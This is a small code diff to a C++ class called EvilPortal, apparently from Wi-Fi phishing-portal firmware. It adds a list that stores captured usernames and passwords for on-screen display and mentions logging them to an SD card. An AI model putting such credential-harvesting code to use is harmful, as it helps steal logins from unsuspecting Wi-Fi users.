@@ -100,6 +100,10 @@ class EvilPortal {
     bool has_ap;
 
     LinkedList<String>* html_files;
+    // Every credential captured this session ("user : pass"), newest last. Shown
+    // as an accumulating list on the portal HUD; capped so it can't grow without
+    // bound (the full history is always written to the SD log).
+    LinkedList<String>* captured_creds = nullptr;
 
     void cleanup();
     String get_user_name();
